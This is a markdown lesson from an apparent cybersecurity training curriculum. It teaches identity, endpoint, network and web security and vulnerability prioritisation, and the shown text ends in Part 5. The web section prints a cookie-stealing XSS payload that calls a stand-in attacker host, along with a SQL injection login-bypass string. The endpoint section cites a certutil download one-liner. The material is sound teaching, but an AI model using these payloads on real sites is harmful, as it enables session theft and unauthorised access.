---
id: cyber-03-security-fundamentals
track: cyber
phase: 3
order: 30
title: "Phase 3 — Security Fundamentals"
duration: "6 weeks"
duration_weeks: 6
energy_mix: [low, normal]
deliverable: "portfolio/cyber/03-security-fundamentals.md"
exit_criteria: "You can explain a simple attack like phishing or web login abuse and name the logs, controls, and response steps involved."
---

# Phase 3 — Security Fundamentals

## Goal of this phase

Learn the core security concepts used across SOC, GRC, IT security, and pentesting before choosing a specialization.

## Estimated time

**6 weeks**. This phase is broad; the goal is working literacy, not mastery.

## Skills you'll gain

- Understand identity security, endpoint security, network security, web security, cloud basics, logging, vulnerability management, and incident response.
- Read alerts and logs with basic context.
- Understand common weaknesses and controls.
- Map simple attacks to MITRE ATT&CK and OWASP Top 10.

## Specific topics to learn

### Identity and access

- Authentication, authorization, accounting
- MFA, SSO, password policies
- Least privilege, RBAC, access reviews
- Account lockout, suspicious login, impossible travel

### Endpoint and malware basics

- EDR/AV purpose
- Malware persistence concept
- Suspicious processes
- Windows Event IDs at beginner level: 4624 successful login, 4625 failed login, 4688 process creation if enabled
- Linux auth logs

### Network security

- Firewalls and rules
- IDS/IPS concepts
- VPNs and segmentation
- Secure ports/protocols
- DNS filtering concept

### Web security

- OWASP Top 10
- SQL injection concept
- XSS concept
- Authentication/session weaknesses
- IDOR concept
- Security headers basics

### Vulnerability management

- CVE, CVSS, EPSS concept
- Asset inventory
- Prioritization
- Remediation vs mitigation
- Patch verification

### Incident response

- Preparation, identification, containment, eradication, recovery, lessons learned
- Evidence handling basics
- Incident timeline
- Reporting

## Lesson: Security Fundamentals

### Why this lesson exists

#### Where the two previous phases meet

Phase 1 gave you the vocabulary. Phase 2 gave you the plumbing. This phase is where the two meet, and where the job you are training for actually starts.

Look again at the exit criterion, because it is the most specific one in the track so far: *you can explain a simple attack like phishing or web login abuse and name the logs, controls, and response steps involved.*

#### The three-part question

Read that carefully, because it is asking for three separate things about one incident.

| Question | What it is really asking |
|---|---|
| Which logs would show this? | Where does the evidence live, and what would it look like? |
| Which controls would have stopped or caught it? | Preventive and detective thinking |
| What would you do, in what order, once you saw it? | Response |

Not “what is phishing” — that was Phase 1. That triad is the shape of every SOC interview question you will ever be asked, and it is the shape of the work itself.

#### Six places to look, not six subjects to memorise

The six topic areas below are not six separate subjects. They are six *places to look* during an investigation.

| Lens | The question it answers |
|---|---|
| Identity | Who was involved? |
| Endpoint | What ran on the machine? |
| Network | How did it travel? |
| Web | What did the application do? |
| Vulnerability management | What weakness allowed it? |
| Incident response | What happens next? |

When you finish this phase, you should be able to take any incident and walk it through those six lenses. That is the working method this lesson is trying to install.

#### The last phase before you choose

This is also the last phase before you choose a specialisation in Phase 5.

The purpose of the breadth here is not to make you good at all six. It is to make you *literate* in all six, so that the choice in Phase 5 is informed rather than guessed. The phase notes this explicitly: “working literacy, not mastery.”

#### How the time breaks down

| What | Time | Note |
|---|---|---|
| Reading this lesson | ~5 hours | Six areas, framed as lenses |
| Five PortSwigger labs | 10–15 hours | The single highest-value task for you |
| Five CVE summaries | 6–8 hours | Drawn from CISA KEV |
| Incident timeline and report | 6–8 hours | Ties the whole phase together |
| Control-mapping table | 3–5 hours | Your first GRC-flavoured artifact |
| Total | 40–50 hours across 6 weeks | Comparable to Phase 2 in size, wider rather than deeper |

It is comparable in size to Phase 2 but wider rather than deeper, which means it is easier to get lost in. The antidote is the deliverable: five PortSwigger labs, five CVE summaries, one incident timeline, one control-mapping table. Those four artifacts are the phase. Reading without producing them will feel productive and teach you very little.

#### One strategic note about your web development background

Of the six areas here, **web security is the one where you already have an unfair advantage.**

You have written code, you know what a form submission does, and you have probably written a database query by string concatenation without knowing it was dangerous. That background is genuinely rare among cyber beginners, most of whom find the web material the hardest.

The PortSwigger labs will land faster for you than for most people. Lean into it, because “I understand why injection happens at the code level” is a differentiator in interviews.

### Part 1 — Identity security: who are you, and should you be here?

#### The three questions, revisited with attack names attached

Phase 1 introduced authentication, authorisation, and accounting (AAA). Here is what failure looks like in each, because recognising the failure is the skill.

| Failure | What it looks like | Why it is hard to spot |
|---|---|---|
| **Authentication failure** | The attacker has valid credentials they should not have — a phished password, credential stuffing against a reused password, a sprayed `Summer2025!`, or a stolen session token | In the logs this looks like a *successful* login from an unexpected place. Nothing is “failing” |
| **Authorisation failure** | The attacker is legitimately logged in but reaches things they should not — a standard user who can open the finance share, or a customer who can read another customer's order by changing a number in the URL (this is IDOR, covered in Part 4) | Every login is legitimate. The abuse looks like normal use |
| **Accounting failure** | Nobody can tell what happened, because the logs are absent, incomplete, or not retained | This is the failure that turns a contained incident into an unanswerable one |

#### Why successful logins are the dangerous ones

The reason this matters for detection is a point beginners find counter-intuitive: **the most dangerous authentication events are successful logins.**

A failed login is noise. The internet is full of automated attempts against every exposed service, and you saw that in Phase 2's auth logs. A *successful* login from an unusual location at an unusual time, for an account that has no reason to be there, is the signal worth investigating.

Detection rules are built around this distinction.

#### MFA, and why it is not perfect

**MFA** (Phase 1) remains the single most effective control against credential theft. It is worth understanding *why* it is not perfect, so here are the attacks that defeat it.

| Attack | How it works | What stops it |
|---|---|---|
| **MFA fatigue / push bombing** | Repeated prompts until the victim approves one out of frustration | Number matching, and a rule that you never approve a prompt you did not initiate |
| **Real-time phishing proxies** | A fake login page relays the victim's credentials *and* their MFA response to the real site in real time, stealing the session that results | Phishing-resistant factors — this is why they exist |
| **SIM swapping** | The attacker convinces a mobile carrier to move the victim's number to a SIM they control, defeating SMS-based codes | Not using SMS. This is the concrete reason SMS MFA is considered the weakest form |
| **Session token theft** | The attacker does not need the password or the MFA prompt at all if they can steal the session cookie issued *after* authentication | Cookie flags (Part 4) and token protection |

#### Ranking the factors, strongest to weakest

| Rank | Factor | Why it sits there |
|---|---|---|
| 1 (strongest) | Hardware security keys (FIDO2/WebAuthn) | Cannot be relayed or intercepted remotely |
| 2 | Authenticator apps with number matching | Bound to the specific login attempt |
| 3 | Push notifications | Approvable by an irritated user |
| 4 (weakest) | SMS codes | Defeated by SIM swapping and interception |

The pattern is simple: the further the factor is from something that can be relayed or intercepted remotely, the better it is.

#### SSO: one login, and one point of failure

**SSO** (Single Sign-On) lets one identity provider authenticate you across many applications.

The security benefit is real and worth stating precisely: it **centralises authentication**.

| What centralising buys you | Why |
|---|---|
| One place to enforce MFA | You configure it once, not per application |
| One place to revoke access | Offboarding is one action, not dozens |
| One log of every login across every application | Investigation starts from a single source |

Without SSO, disabling a departing employee means chasing dozens of separate accounts, and each one is a chance to miss a system.

The trade-off is equally real: SSO makes the identity provider a **single point of failure**. Compromise one account with SSO access and you may reach everything behind it. This is why identity providers get the strongest controls available — hardware keys, conditional access, and aggressive monitoring.

#### Conditional access: deciding on context, not just credentials

**Conditional access** is the modern refinement. It is policy that decides whether to allow a login based on context rather than credentials alone.

| Signal | Example decision |
|---|---|
| Is the device managed? | An unmanaged device may be blocked or require extra verification |
| Is the location expected? | A login from an unexpected country can be challenged |
| Is the risk score from the identity provider high? | A high score forces re-authentication or blocks outright |

A login with a correct password from an unmanaged device in an unexpected country can be blocked or forced to re-authenticate. This is the control that most directly addresses the authentication failures above.

#### Account lockout: a control that can be abused

Three alert types come up constantly in SOC work, and the phase lists all three. Being able to explain them — and to say what a *false positive* looks like — is exactly the literacy this phase wants.

**Account lockout** is a policy that locks an account after N failed attempts, used to blunt brute-force attacks.

But note the nuance: lockout is a control that can itself be abused. An attacker who deliberately locks accounts is performing a **denial of service**. In some cases, lockout spikes are how an attacker forces a helpdesk call that they then social-engineer.

The SOC question is not “did an account lock?” but “is this one account being hammered, or many accounts lightly touched?”

| Pattern | What it is | Why it matters |
|---|---|---|
| One account, many failures | Brute force | Lockout policy will trigger and blunt it |
| Many accounts, one failure each | Spraying (Phase 1) | Evades lockout entirely, because each account sees only one failure |

#### Suspicious login, and the baseline problem

**Suspicious login** is a successful login that does not fit the account's normal pattern.

What makes it suspicious is context:

| Signal | What it suggests |
|---|---|
| A new country | Travel, a VPN, or a compromise |
| A new device | A new machine, or an attacker's machine |
| An unusual hour | Off-hours work, or automation |
| A login to an application the user has never touched | Lateral access or a compromised account |

The investigative instinct to build now: **compare against a baseline.** “Suspicious” is meaningless without knowing what normal looks like for that account.

#### Impossible travel, and its two honest caveats

**Impossible travel** is two successful logins from geographically distant locations within a timeframe that makes physical travel impossible — Manila at 09:00 and London at 09:30.

It is a strong signal because it cannot be explained by the user simply moving. Two honest caveats separate a thoughtful analyst from one reciting a rule.

| Caveat | Why it happens |
|---|---|
| VPNs and corporate proxies routinely cause false positives | The apparent location is the exit node rather than the user |
| A *real* attacker may also use a VPN | Precisely to make their location look plausible |

The alert is a prompt to investigate, not a conclusion.

#### Least privilege, RBAC, and access reviews

**Least privilege** and **access review** were defined in Phase 1. The new material here is **RBAC** — Role-Based Access Control — which is how least privilege is actually implemented at scale.

Rather than granting permissions to individuals, you define **roles** that bundle the permissions a job function needs, and you assign people to roles.

| Role | Grants |
|---|---|
| `Helpdesk-Tier1` | Password reset and ticket access |
| `Finance-ReadOnly` | Read access to finance systems |

A person changing jobs changes role, and their access changes with it in one operation.

#### The shape every access question takes

Note that this is the group pattern from the IT track's sysadmin phase, scaled up and named.

In fact every access question in this phase reduces to the same shape you already learned: **user → role → permission**, never user → permission directly. When an access review asks “who can read the finance share?”, the answer should be one role's membership list, not a manual audit of a hundred individual grants.

#### Turning identity into log evidence

This is the part that makes identity *detective* rather than just administrative, and it connects directly to the exit criterion. The Windows Event IDs the phase lists are the foundation.

| Event ID | Meaning | Why an analyst cares |
|---:|---|---|
| **4624** | Successful logon | The dangerous one. Note the **logon type** — type 3 is network, type 10 is RDP |
| **4625** | Failed logon | Brute force and spraying. Volume and pattern matter more than any single event |
| **4688** | Process creation | What ran after the login — *if* auditing is enabled |
| **4672** | Special privileges assigned | An account granted admin-level rights at logon |
| **4720 / 4726** | User account created / deleted | Persistence. A new account is a foothold |

#### Reading the logon type in a 4624 event

The **logon type** in a 4624 event is worth understanding, because it answers “how did they get in?”

| Logon type | What it means | When you would look here |
|---:|---|---|
| 2 | Local console login | Someone physically at the machine |
| 3 | Network logon — a file share or a remote service | Lateral movement, share access |
| 10 | Remote Desktop (RDP) | After a suspected RDP compromise |

Seeing logon type 10 for an account that never uses RDP is a finding.

#### The Linux equivalent

In Linux the equivalent evidence lives where Phase 2 showed you: `/var/log/auth.log` or `/var/log/secure`, read through `journalctl -u sshd`.

The investigative questions are the same ones — which account, from where, at what time, and does that fit the baseline.

The point to carry forward: **identity is where nearly every investigation begins**, because nearly every attack needs an account. Part 6's incident timeline is built on exactly this foundation.

### Part 2 — Endpoint security and malware behaviour

#### What EDR actually does, and how it differs from antivirus

**Antivirus (AV)** and **Endpoint Detection and Response (EDR)** are often spoken of together. They are genuinely different tools.

| Tool | How it works | Strength | Structural weakness |
|---|---|---|---|
| **AV** | Holds a database of known-malicious file hashes and patterns, and blocks matches | Fast and effective against known malware | Useless against anything new or modified. Change one byte of a known virus and the signature no longer matches |
| **EDR** | Continuously records what happens on the endpoint and evaluates those sequences against known-attack patterns | Catches behaviour, not just identity | Nothing catches everything; it is only as good as its baseline |

The AV weakness is why “the antivirus says it is clean” was never proof of anything, a point Phase 1 made about rootkits.

#### Detection by behaviour, not by signature

The shift in the second row of that table is the important idea. Instead of asking “is this file known-bad?”, EDR asks “does this *sequence of actions* look like an attack?”

Consider this chain:

| Step | Action |
|---|---|
| 1 | A document reader starts |
| 2 | It spawns a command shell |
| 3 | The shell downloads a file |
| 4 | A scheduled task is added |

That is suspicious regardless of whether any individual step matches a signature. No single step is malicious on its own. The sequence is.

#### Telemetry: the second half of EDR's value

That behavioural record is the second half of EDR's value: **telemetry**. An EDR agent keeps a searchable history of endpoint activity, which means that after an alert you can reconstruct what happened.

This is where the free tools in this phase's table fit.

| Tool | What it is | What it is not |
|---|---|---|
| **Sysmon** (System Monitor, from Microsoft's Sysinternals suite) | A telemetry source that writes detailed process, network, and file events to the Windows event log | Not antivirus, and it does not block anything |
| **Wazuh** | Collects and analyses those events centrally | Not an endpoint agent on its own |

Sysmon is what makes host investigation possible at all.

#### Holding the four categories straight

A useful way to hold the relationship:

| Tool category | Its one job |
|---|---|
| Sysmon | *Records* |
| EDR | *Detects and responds* |
| AV | *Blocks known bad* |
| SIEM | *Correlates across many sources* |

The phase's tools table gives you the free end of each category.

#### The Event IDs that reveal process activity

Event ID **4688** (process creation) is the endpoint equivalent of the identity event IDs, and it has one important practical caveat the phase hints at with “if enabled”: **process creation auditing is not on by default on Windows.**

You must enable it, which is itself a lesson about detection — *the absence of an event does not mean the absence of activity; it may mean nobody turned the logging on.*

#### Parent-child relationships are where detection lives

When 4688 is enabled alongside Sysmon, each process start records the **parent process**.

| Pattern | Why it is suspicious |
|---|---|
| `winword.exe` → `powershell.exe` | A document spawning a shell. This is a macro-based attack, and normal documents never do it |
| `w3wp.exe` → `cmd.exe` | A web server spawning a command shell — a webshell or exploit |
| `outlook.exe` → `cmd.exe` | Email client spawning a shell |
| `svchost.exe` with an unusual parent | `svchost` should be spawned by `services.exe`. Any other parent suggests masquerading |

#### Masquerading, and why you check the full path

That last row introduces **masquerading** — naming a malicious file after a legitimate system process to blend in. It is a MITRE ATT&CK technique (T1036).

It is why an analyst checks the *full path* rather than the filename.

| What you see | Verdict |
|---|---|
| `C:\Windows\System32\svchost.exe` | The real one |
| `C:\Users\Public\svchost.exe` | Not the real one |

Legitimate Windows binaries run from their expected directories, and that predictability is what makes impersonation detectable.

#### Persistence: how malware survives a reboot

**Persistence** is the set of techniques malware uses to survive restarts. It is one of the most important concepts in this phase, because it is where defenders have the advantage.

The reason is simple: **an attacker must persist somewhere, and the places they can persist are a finite, enumerable list.** Knowing that list is knowing where to look.

#### The common persistence mechanisms

| Mechanism | Where | What it does |
|---|---|---|
| **Registry Run keys** | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` and its `HKLM` equivalent | Causes a program to start at login. The classic location, and still heavily used |
| **Scheduled tasks** | Windows Task Scheduler | Runs a command on a trigger. Extremely common, because it looks like legitimate administration and can run as SYSTEM |
| **Services** | Windows service control manager | A malicious service set to start automatically. Runs with high privilege and is easy to overlook |
| **Startup folders** | The user's Startup directory | Simple and visible, so attackers with better options avoid it |
| **WMI event subscriptions** | Windows Management Instrumentation | Persistence through WMI, which is fileless and therefore harder to spot |
| **Linux equivalents** | `cron` jobs, `systemd` unit files, shell profile files like `~/.bashrc`, and SSH `authorized_keys` | Adding a key is persistence *and* a backdoor in one step |

#### Why persistence detection is genuinely hard

Each of those mechanisms has an ordinary administrative purpose. That is exactly why persistence detection is hard: you are not looking for something that is obviously malicious, you are looking for something *unexplained*.

This is where baseline knowledge does the work. You need to know what should be in the Run keys before you can say something should not be.

The investigative habit: **when you find one persistence mechanism, assume there are others.** Attackers commonly establish two or three, so that removing one does not evict them. A complete response removes all of them, which is why eradication (Part 6) follows a full enumeration rather than a single fix.

#### Suspicious process indicators

Beyond parent-child relationships, these are the process-level signals worth recognising.

| Indicator | What it looks like | Why it is suspicious |
|---|---|---|
| **Living off the land** | Using legitimate built-in tools for malicious purposes: `powershell.exe`, `cmd.exe`, `wmic`, `certutil`, `bitsadmin`, `rundll32`, `mshta` | Suspicious not because they are malicious but because they are frequently *abused*, and security tools cannot simply block them. `certutil -urlcache -f http://...` downloading a file is a classic example: a legitimate certificate utility used as a downloader |
| **Encoded command lines** | PowerShell invoked with `-EncodedCommand` and a long base64 string | There is almost no legitimate reason to obfuscate a command line, and it exists to defeat text-based detection |
| **Processes from odd locations** | `C:\Users\Public\`, `C:\Temp\`, `%APPDATA%`, or `/tmp` on Linux | Legitimate system binaries do not run from user-writable directories; that is the whole point of the expectation |
| **Unexpected network connections from office applications** | Word opening a connection to an unfamiliar IP | It is not normal behaviour for a document reader |
| **Unusual accounts in process ownership** | A service running as a normal user account rather than a service account, or a process running as SYSTEM that has no business doing so | Both indicate misconfiguration or compromise |

Notice the recurring theme across every one of these: **the indicator is a deviation from expectation, not a signature of evil.**

This is the single most important mental shift in endpoint security. You cannot detect modern intrusions by looking for known-bad. You detect them by knowing what normal looks like and noticing what does not.

### Part 3 — Network security

#### Firewalls: rules, direction, and default posture

A **firewall** permits or denies traffic based on rules. The rule anatomy is worth being precise about, because you will read these in real jobs.

```text
Action | Source        | Destination   | Port | Protocol | Direction
ALLOW  | 10.0.0.0/24   | 10.0.5.20     | 443  | TCP      | Inbound
DENY   | any           | 10.0.5.20     | 3389 | TCP      | Inbound
```

#### Default posture: the decision that matters most

Two concepts matter more than any individual rule. The first is **default posture**.

| Posture | Behaviour | Consequence |
|---|---|---|
| **Default-deny** | Blocks everything not explicitly allowed | A forgotten rule fails safely. This is the correct posture and the industry standard |
| **Default-allow** | Permits everything not explicitly blocked | Every oversight is an open door |

#### Direction and state

The second concept is **direction and state**.

Modern firewalls are **stateful**. When an internal machine makes an outbound connection, the firewall remembers it and permits the return traffic automatically. This is why a rule permitting outbound traffic does not require a matching inbound rule.

It also explains why the *direction* of a rule is essential context. An inbound deny for port 3389 that permits outbound 3389 tells you the rule set was written without understanding what it protects.

#### Three questions to ask of any rule set

The security analysis of a firewall rule set asks three questions.

| Question | Example of the finding |
|---|---|
| What is unnecessarily open? | A rule permitting RDP from `any` |
| What is open to too many sources? | A rule permitting database access from the entire corporate network rather than one application server |
| What is stale? | A rule left over from a project that ended two years ago |

Stale rules are the most common real finding, because nobody wants to delete a rule in case something breaks.

#### IDS and IPS: detection versus prevention

**IDS** (Intrusion Detection System) monitors traffic and *alerts*. **IPS** (Intrusion Prevention System) monitors and *blocks*. The single-letter difference is the whole story, and so is the trade-off.

| System | Position | Can it stop an attack? | Cost of a false positive |
|---|---|---|---|
| **IPS** | Inline, in the path of traffic | Yes | It *breaks legitimate traffic* |
| **IDS** | Out of band, receiving a copy | No | It can never break anything, and can never stop anything |

This is why organisations often start in detection mode even with IPS-capable hardware. Blocking first, before you understand your false-positive rate, is how you cause an outage.

#### Detection methods: signatures versus anomalies

| Method | How it works | Catches | Cost |
|---|---|---|---|
| **Signature-based** | Matches known attack patterns | Known attacks, precisely | Blind to anything new |
| **Anomaly-based** | Flags deviation from a learned baseline | Novel attacks | Many false positives, because networks are full of legitimate unusual behaviour |

Both struggle with the same fundamental problem, and naming it is what shows understanding: **encrypted traffic**.

If TLS hides the content, signature matching cannot see inside without interception. This is why modern detection leans on metadata — connection patterns, volumes, timing, destinations, and JA3/JA4 fingerprints of the TLS handshake itself — rather than payload inspection.

#### VPNs and segmentation

A **VPN** (Phase 2) creates an encrypted tunnel. In corporate use it also places the remote device *inside* the network, as though it were on-site. That is its security purpose and its risk in one sentence: a compromised laptop on the VPN is an internal machine, with internal reach.

**Segmentation** is the practice of dividing a network into zones so that compromise of one does not mean compromise of all. The classic example is separating the corporate network from the server network from the industrial control network, with firewall rules controlling the paths between.

The security value is **containment**. It limits **lateral movement**, the phase where an attacker who has one foothold moves through the network looking for more.

#### Microsegmentation and the flat network

Two related ideas worth knowing.

| Idea | What it is |
|---|---|
| **Microsegmentation** | The same principle applied at the level of individual workloads rather than network zones. Common in cloud environments |
| **The flat network** | Everything on one segment with no internal controls. The anti-pattern all of this exists to avoid |

In a flat network, one phished laptop can reach every server. Segmentation is what makes the difference between “we had an incident” and “we had a breach.”

A good interview answer connects this to the CIA triad and to least privilege: segmentation is least privilege applied to *network reachability* rather than to accounts. The same principle, a different dimension.

#### Secure protocols: the insecure/secure pairing

The **secure ports and protocols** question is really the question “is this traffic encrypted and authenticated?” The pattern to learn is the pairing of an insecure protocol with its secure replacement.

| Insecure | Secure | Notes |
|---|---|---|
| HTTP (80) | HTTPS (443) | TLS |
| FTP (21) | SFTP (22) / FTPS | Credentials in plaintext over FTP |
| Telnet (23) | SSH (22) | Telnet sends everything, including passwords, in the clear |
| SMTP (25) | SMTPS (465) / submission (587) | Encryption in transit |
| LDAP (389) | LDAPS (636) | Directory queries carry credentials |
| SNMPv1/v2 (161) | SNMPv3 | v3 adds authentication and encryption |

The reason this table is worth knowing rather than looking up is that spotting telnet or FTP in a scan is an immediate finding. Doing so *instantly* is what makes a scan review efficient. Phase 2 taught you to read a port list; this is what you read it *for*.

#### DNS filtering: early in the chain, easy to bypass

**DNS filtering** is the practice of blocking resolution of known-malicious domains.

Its appeal is that it sits early in the attack chain. Malware must typically resolve a command-and-control domain before it can do anything, so blocking the lookup breaks the attack before any file is delivered. It also covers every device on the network without an agent.

Its limitation is equally important, and is why it is a *layer* rather than a solution.

| Bypass | Why filtering misses it |
|---|---|
| Direct-to-IP connections | DNS filtering only works on names |
| DNS-over-HTTPS clients | The lookup is encrypted and leaves the network's resolver entirely |
| Domain generation algorithms | Malware generates hundreds of candidate domains, so blocking a list catches only some |

DNS filtering stops unsophisticated attacks cheaply and is trivially bypassed by sophisticated ones. Both halves of that sentence belong in your answer.

### Part 4 — Web security: the domain where you start ahead

#### Why your background matters here

The OWASP Top 10 was introduced in Phase 1 as a shared vocabulary. This part is where you learn to actually find and reason about the categories, and where your web development history becomes an asset.

#### The one sentence that organises this whole part

The organising insight, and the sentence to remember: **almost every web vulnerability is a failure to keep data and code separate, or a failure to check that the person asking is allowed to ask.**

| Failure | Which categories it covers |
|---|---|
| Data escaped into code | Injection attacks — SQL injection and XSS |
| Not checking whether the asker is allowed | Broken access control, IDOR, and session weaknesses |

That is genuinely most of it.

#### Injection: one bug in different interpreters

The phase lists SQL injection and XSS separately, but they are the *same bug* in different interpreters. Understanding that is more valuable than learning them as two facts.

**Injection** happens when untrusted input is interpreted as instructions rather than as data. The vulnerability exists wherever a program builds a command by concatenating strings. The specific name depends on what is being concatenated into.

| Name | The interpreter | Where the input lands |
|---|---|---|
| SQL injection | A database | A query |
| Cross-site scripting (XSS) | A browser | HTML that becomes script |
| Command injection | The operating system shell | A shell command |

#### Worked example: SQL injection in one query

**SQL injection** occurs when user input becomes part of a database query. Consider this legitimate query:

```sql
SELECT * FROM users WHERE username = 'alice' AND password = 'secret123';
```

The application builds it by concatenation. The user enters `' OR '1'='1` as the password, and the query becomes:

```sql
SELECT * FROM users WHERE username = 'alice' AND password = '' OR '1'='1';
```

Since `'1'='1'` is always true, the `WHERE` clause matches every row and the login succeeds with no valid password.

Notice what actually went wrong: **the database did exactly what it was told.** The application handed it a string in which the *data* had escaped into the *code*, and the database cannot tell the difference.

#### The fix: parameterised queries

The fix is **parameterised queries** (prepared statements), where the query structure is sent separately from the values. The database then knows `' OR '1'='1` is a password string and never an instruction.

This is the point worth internalising: **SQL injection is not fixed by filtering input, it is fixed by never letting input become code.**

| Approach | What it does | Verdict |
|---|---|---|
| Escaping and blocklists | Tries to neutralise dangerous characters | Band-aids that miss encodings |
| Parameterised queries | Separates structure from values | Removes the vulnerability class |

#### XSS: the same bug, browser as interpreter

**Cross-site scripting (XSS)** is the same failure with the browser as the interpreter: untrusted input is rendered into HTML, so it becomes script that runs in *another user's* browser.

Two forms, and the second is worse.

| Form | How it works | Who it hits |
|---|---|---|
| **Reflected** | A search page echoes the query. Submit `<script>fetch('https://evil.example/?c='+document.cookie)</script>` and if the page renders it as HTML rather than text, every visitor's session cookie is sent to the attacker | Whoever follows the crafted link |
| **Stored** | The payload is saved — in a comment, a profile, a support ticket — and fires for everyone who views it | Everyone, with no interaction needed |

The fix is **output encoding** — rendering untrusted data as text, not markup — supported by **Content Security Policy**, which restricts where scripts may load from.

#### The link back to Part 1

Note the connection to Part 1: stealing the session cookie is a *session token theft*, which defeats MFA entirely because authentication already happened.

This is why the `HttpOnly` cookie flag exists. It makes cookies unreadable from JavaScript, which does not fix XSS but removes one of its worst payoffs.

#### Broken access control and IDOR

**IDOR** — Insecure Direct Object Reference — is the vulnerability where an application exposes a reference to an internal object and trusts the client to use it correctly. It is the clearest example of an authorisation failure (Part 1), and it is dead simple to understand.

```text
GET /api/invoices/1001     → your invoice
GET /api/invoices/1002     → someone else's invoice
```

If the second request returns data, the application checked *authentication* (are you logged in?) but not *authorisation* (is this invoice yours?).

The fix is a server-side check on every request that the authenticated user is permitted to access the specific object.

#### The wrong assumption that makes IDOR common

The security reason this bug is so common is an assumption that runs through many codebases: developers assume that because the UI only ever shows users their own links, nobody will type a different number.

**The UI is not a control. Anything the client sends is attacker-controlled.**

#### Broken access control: the wider category

**Broken access control** is the wider category — the OWASP Top 10's number one entry in recent editions. It covers IDOR plus two related bugs.

| Bug | What it looks like |
|---|---|
| IDOR | Changing an object identifier to reach someone else's data |
| Privilege escalation | A normal user reaching admin functions by calling the admin endpoint directly |
| Forced browsing | Reaching a page by URL when the link is hidden |

All of them share the same root cause and the same fix: enforce permissions on the server, for every request, based on identity rather than on what the interface offers.

#### Session and authentication weaknesses

Sessions are how a web application remembers you across requests. They are a high-value target because *a stolen session is a completed authentication.*

| Weakness | How it works |
|---|---|
| **Session fixation** | The attacker sets a known session ID before the victim logs in. If the application does not issue a fresh ID at login, the attacker now holds a valid session |
| **Predictable session IDs** | Sequential or weakly random identifiers that can be guessed |
| **No expiry or no logout invalidation** | Sessions that live forever, or that remain valid server-side after logout. A token that still works after “log out” is a real-world finding |
| **Missing cookie flags** | `Secure` (HTTPS only) and `HttpOnly` (unreadable from JavaScript, as above). `SameSite` addresses cross-site request forgery, where another site causes the victim's browser to make an authenticated request |
| **Credentials in URLs** | Tokens in query strings end up in browser history, proxy logs, and `Referer` headers |

#### Security headers: the defence-in-depth layer

**Security headers** are the defence-in-depth layer, and the phase asks only for basics. Four are worth knowing.

| Header | What it does |
|---|---|
| `Content-Security-Policy` | Restricts script sources. The strongest XSS mitigation |
| `Strict-Transport-Security` | Forces HTTPS for future visits |
| `X-Content-Type-Options: nosniff` | Stops content-type sniffing |
| `X-Frame-Options` or the CSP `frame-ancestors` directive | Prevents clickjacking, where your site is embedded invisibly in another |

You can check any site's headers with `curl -I`, which is a small, satisfying thing to do on a site you own.

#### How to actually practise this

The phase's task 4 is **five PortSwigger Apprentice labs**, and this is the single highest-value task in the phase for you. PortSwigger's Web Security Academy is free, needs no setup, and runs in a browser. Each lab is a real application with a real vulnerability and a defined objective.

Do them properly. For each lab, write down four things.

| What to record | Why |
|---|---|
| What the vulnerability was | Names the class, which is what an interviewer listens for |
| How you found it | The method is the transferable skill |
| What the payload or request looked like | The concrete evidence |
| Why the fix would work | Proves you understand the cause, not just the symptom |

Five labs understood at that level are worth more than fifty completed by following a walkthrough.

And because your background is web development, add one thing most learners cannot: **write the vulnerable code, then write the fixed version.** Seeing your own parameterised query block the injection you just performed is the lesson that sticks.

#### The tools that make this practical

**OWASP ZAP** and **Burp Suite Community** (task 5) are intercepting proxies. They sit between your browser and the target so you can read and modify every request.

| Tool | Character |
|---|---|
| Burp Suite Community | The industry-standard tool for manual web testing |
| OWASP ZAP | The free open-source equivalent |

Running a **passive scan** against your own application is safe and instructive: it reports what it observes without attacking anything.

### Part 5 — Vulnerability management: deciding what to fix first

#### CVE, CVSS, and EPSS: three acronyms, three questions

The phase lists three acronyms here, and they answer three different questions.

| Acronym | Full name | The question it answers | Example |
|---|---|---|---|
| **CVE** | Common Vulnerabilities and Exposures | *Which vulnerability is this?* | `CVE-2021-44228` |
| **CVSS** | Common Vulnerability Scoring System | *How bad is it technically?* | 0.0 to 10.0 |
| **EPSS** | Exploit Prediction Scoring System | *How likely is this to actually be exploited in the next 30 days?* | A probability between 0 and 1, derived from real-world activity |

**CVE** is a naming system, nothing more. Its value is that everyone worldwide means the same thing by the same number.

#### CVSS bands, and what goes into the score

**CVSS** is the severity score, 0.0 to 10.0, and scores map to qualitative bands.

| Score | Band |
|---:|---|
| 9.0–10.0 | Critical |
| 7.0–8.9 | High |
| 4.0–6.9 | Medium |
| 0.1–3.9 | Low |

CVSS is computed from characteristics like whether the attack is remote, whether authentication is needed, and what the impact on confidentiality, integrity, and availability is. Note that this is the CIA triad from Phase 1 appearing inside the scoring formula. The `CVE-2021-44228` example above (Log4Shell) scored 10.0.

#### Why CVSS alone is a poor prioritisation tool

The reason all three matter together is the phase's next topic — prioritisation. The reason prioritisation is hard is a fact worth stating plainly: **CVSS alone is a poor prioritisation tool.**

There are far more “critical” CVEs than any team can fix, and most of them are never exploited.

| Example | CVSS | Actual priority |
|---|---:|---|
| A CVSS 9.8 vulnerability in software you do not run | 9.8 | Irrelevant |
| A CVSS 6.5 vulnerability actively exploited in the wild, on an internet-facing server, holding customer data | 6.5 | An emergency |

#### The five signals professional triage combines

So the professional triage combines signal.

| Signal | What it tells you |
|---|---|
| **CISA's Known Exploited Vulnerabilities (KEV) catalog** | A list of CVEs confirmed as exploited in the wild. This is why the phase's task 6 draws from KEV specifically: these are not theoretical. If a KEV entry affects your asset inventory, that is a top priority by definition |
| **EPSS** | Likelihood of exploitation, for ranking within the rest |
| **Exposure** | Is the system internet-facing or internal? Reachable is urgent |
| **Asset criticality** | What breaks, and who is affected, if it falls? |
| **Existing controls** | Is the vulnerable component even reachable, or is it behind a firewall and authentication? |

That is **risk-based** prioritisation, and it is the same `likelihood × impact` reasoning from Phase 1 applied to a specific list of technical findings. Doing that arithmetic and being able to defend it is a core skill in both SOC and GRC work.

#### Asset inventory: the prerequisite nobody wants to do

**Asset inventory** — knowing what you own — is unglamorous, and it is the foundation of everything else in this part.

Without it, three things become impossible.

| You cannot… | Because… |
|---|---|
| Patch | You cannot patch what you cannot list |
| Assess exposure | You cannot assess exposure for a system you do not know exists |
| Judge a CVE | You cannot know whether a CVE affects you without knowing your software versions |

The practical failure mode in real organisations is that the inventory is incomplete and outdated: a spreadsheet maintained by hand, shadow IT that nobody registered, cloud instances spun up and forgotten. Every one of those is invisible to the patching process.

